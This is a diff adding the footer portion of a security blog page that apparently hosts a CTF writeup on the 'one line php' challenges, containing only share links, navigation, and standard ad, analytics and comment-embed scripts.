+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&title=Detailed writeup of both one line php and Return of one line php"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tarunkant.github.io/2018/12/21/one-line-and-return-of-one-line-php-writeup/&name=Detailed writeup of both one line php and Return of one line php&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 SpyD3r
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad_1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6813652886953741"
+     data-ad-slot="9851733933"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-122832343-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'spyclub';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
